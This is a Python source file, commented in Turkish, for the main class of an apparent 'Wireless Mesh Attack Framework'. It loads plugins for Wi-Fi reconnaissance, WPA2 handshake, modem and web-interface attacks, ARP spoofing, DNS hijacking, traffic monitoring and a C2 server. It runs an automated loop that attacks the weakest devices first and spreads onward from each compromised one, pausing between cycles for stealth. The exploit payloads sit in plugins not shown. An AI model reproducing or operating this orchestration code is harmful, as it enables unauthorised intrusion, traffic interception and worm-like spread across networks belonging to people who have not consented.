"""
Wireless Mesh Attack Framework - Ana sınıf
"""

import time
import threading
from typing import Dict, List, Optional
from pathlib import Path

from .config import Config
from .logger import Logger
from .plugin_manager import PluginManager
from .stealth import StealthManager
from .utils import Utils

class WirelessMeshAttackFramework:
    """Ana framework sınıfı"""
    
    def __init__(self, config: Config, logger: Logger):
        self.config = config
        self.logger = logger
        self.utils = Utils()
        self.stealth = StealthManager(config, logger)
        self.plugin_manager = PluginManager(config, logger)
        
        # Framework durumu
        self.is_running = False
        self.attack_network = {}
        self.discovered_devices = []
        self.compromised_devices = []
        
        # Threading
        self.threads = []
        
        self.logger.info("Wireless Mesh Attack Framework başlatıldı")
    
    def scan_networks(self, interface: str) -> List[Dict]:
        """Wi-Fi ağlarını tara"""
        self.logger.info(f"Wi-Fi ağları taranıyor... (Arayüz: {interface})")
        
        # Reconnaissance modüllerini yükle
        wifi_scanner = self.plugin_manager.load_plugin("reconnaissance.wifi_scanner")
        device_discovery = self.plugin_manager.load_plugin("reconnaissance.device_discovery")
        
        # Wi-Fi ağlarını tara
        networks = wifi_scanner.scan_networks(interface)
        self.logger.info(f"{len(networks)} ağ bulundu")
        
        # Her ağda cihaz keşfi yap
        for network in networks:
            devices = device_discovery.discover_devices(network)
            network['devices'] = devices
            self.discovered_devices.extend(devices)
        
        # Sonuçları kaydet
        self.attack_network['networks'] = networks
        self.attack_network['devices'] = self.discovered_devices
        
        return networks
    
    def attack_target(self, target: str, interface: str) -> bool:
        """Hedef cihaza saldır"""
        self.logger.info(f"Hedef saldırılıyor: {target}")
        
        # Saldırı modüllerini yükle
        wpa2_attack = self.plugin_manager.load_plugin("attacks.wpa2_handshake")
        web_exploit = self.plugin_manager.load_plugin("attacks.web_exploit")
        modem_exploit = self.plugin_manager.load_plugin("attacks.modem_exploit")
        
        # Hedef türünü belirle
        target_type = self.utils.detect_target_type(target)
        
        success = False
        
        if target_type == "modem":
            # Modem saldırısı
            success = modem_exploit.attack_modem(target, interface)
        elif target_type == "web":
            # Web arayüzü saldırısı
            success = web_exploit.attack_web_interface(target)
        else:
            # WPA2 saldırısı
            success = wpa2_attack.attack_network(target, interface)
        
        if success:
            self.logger.success(f"Hedef başarıyla ele geçirildi: {target}")
            self.compromised_devices.append({
                'id': target,
                'type': target_type,
                'compromise_time': time.time(),
                'attack_method': 'unknown'
            })
        else:
            self.logger.error(f"Hedef ele geçirilemedi: {target}")
        
        return success
    
    def pivot_from_device(self, device_id: str) -> bool:
        """Cihazdan pivoting yap"""
        self.logger.info(f"Pivoting başlatılıyor: {device_id}")
        
        # Pivoting modüllerini yükle
        arp_spoofing = self.plugin_manager.load_plugin("pivoting.arp_spoofing")
        dns_hijacking = self.plugin_manager.load_plugin("pivoting.dns_hijacking")
        traffic_monitor = self.plugin_manager.load_plugin("pivoting.traffic_monitor")
        
        # Cihazı bul
        device = self.utils.find_device_by_id(device_id, self.compromised_devices)
        if not device:
            self.logger.error(f"Cihaz bulunamadı: {device_id}")
            return False
        
        # Pivoting işlemlerini başlat
        success = arp_spoofing.start_spoofing(device)
        if success:
            dns_hijacking.start_hijacking(device)
            traffic_monitor.start_monitoring(device)
            
            self.logger.success(f"Pivoting başarılı: {device_id}")
            return True
        
        return False
    
    def create_attack_map(self, output_file: str) -> str:
        """Saldırı haritası oluştur"""
        self.logger.info("Saldırı haritası oluşturuluyor...")
        
        # Mapping modüllerini yükle
        network_mapper = self.plugin_manager.load_plugin("mapping.network_mapper")
        attack_visualizer = self.plugin_manager.load_plugin("mapping.attack_visualizer")
        
        # Ağ haritası oluştur
        network_map = network_mapper.create_network_map(self.attack_network)
        
        # Saldırı görselleştirmesi
        map_file = attack_visualizer.create_attack_map(
            network_map, 
            self.compromised_devices,
            output_file
        )
        
        self.logger.success(f"Saldırı haritası oluşturuldu: {map_file}")
        return map_file
    
    def start_c2_server(self) -> None:
        """C2 sunucusunu başlat"""
        self.logger.info("C2 sunucusu başlatılıyor...")
        
        # C2 modüllerini yükle
        c2_server = self.plugin_manager.load_plugin("c2_panel.server")
        
        # Sunucuyu başlat
        c2_server.start_server(self.config.get('c2_port', 8080))
    
    def start_automated_attack(self) -> None:
        """Otomatik saldırı döngüsünü başlat"""
        self.logger.info("Otomatik saldırı döngüsü başlatılıyor...")
        self.is_running = True
        
        # Ana saldırı thread'ini başlat
        attack_thread = threading.Thread(target=self._attack_loop)
        attack_thread.daemon = True
        attack_thread.start()
        self.threads.append(attack_thread)
        
        # Haritalandırma thread'ini başlat
        mapping_thread = threading.Thread(target=self._mapping_loop)
        mapping_thread.daemon = True
        mapping_thread.start()
        self.threads.append(mapping_thread)
    
    def stop_automated_attack(self) -> None:
        """Otomatik saldırıyı durdur"""
        self.logger.info("Otomatik saldırı durduruluyor...")
        self.is_running = False
        
        # Thread'leri bekle
        for thread in self.threads:
            thread.join(timeout=5)
        
        self.threads.clear()
    
    def _attack_loop(self) -> None:
        """Saldırı döngüsü"""
        while self.is_running:
            try:
                # Yeni hedefler ara
                new_targets = self._find_new_targets()
                
                # Her hedefe saldır
                for target in new_targets:
                    if not self.is_running:
                        break
                    
                    success = self.attack_target(target['id'], target['interface'])
                    if success:
                        # Başarılı saldırıdan yayıl
                        self._spread_from_device(target['id'])
                
                # Gizlilik için bekle
                time.sleep(self.config.get('attack_interval', 30))
                
            except Exception as e:
                self.logger.error(f"Saldırı döngüsünde hata: {e}")
                time.sleep(10)
    
    def _mapping_loop(self) -> None:
        """Haritalandırma döngüsü"""
        while self.is_running:
            try:
                # Haritayı güncelle
                self.create_attack_map("data/attack_map.html")
                
                # Gizlilik için bekle
                time.sleep(self.config.get('mapping_interval', 60))
                
            except Exception as e:
                self.logger.error(f"Haritalandırma döngüsünde hata: {e}")
                time.sleep(30)
    
    def _find_new_targets(self) -> List[Dict]:
        """Yeni hedefler bul"""
        targets = []
        
        # Keşfedilen cihazlardan henüz saldırılmamış olanları seç
        for device in self.discovered_devices:
            if not any(d['id'] == device['id'] for d in self.compromised_devices):
                targets.append(device)
        
        # Güvenlik skoruna göre sırala (en zayıftan başla)
        targets.sort(key=lambda x: x.get('security_score', 10))
        
        return targets[:self.config.get('max_targets_per_cycle', 5)]
    
    def _spread_from_device(self, device_id: str) -> None:
        """Cihazdan yayıl"""
        try:
            # Pivoting başlat
            if self.pivot_from_device(device_id):
                # Yeni cihazları keşfet
                new_devices = self._discover_from_device(device_id)
                self.discovered_devices.extend(new_devices)
                
        except Exception as e:
            self.logger.error(f"Yayılma hatası ({device_id}): {e}")
    
    def _discover_from_device(self, device_id: str) -> List[Dict]:
        """Cihazdan yeni cihazları keşfet"""
        # Bu fonksiyon, ele geçirilen cihazdan yeni cihazları keşfeder
        # Şimdilik boş liste döndür
        return []
    
    def get_statistics(self) -> Dict:
        """İstatistikleri döndür"""
        return {
            'total_devices': len(self.discovered_devices),
            'compromised_devices': len(self.compromised_devices),
            'success_rate': len(self.compromised_devices) / max(len(self.discovered_devices), 1),
            'attack_network': self.attack_network
        } 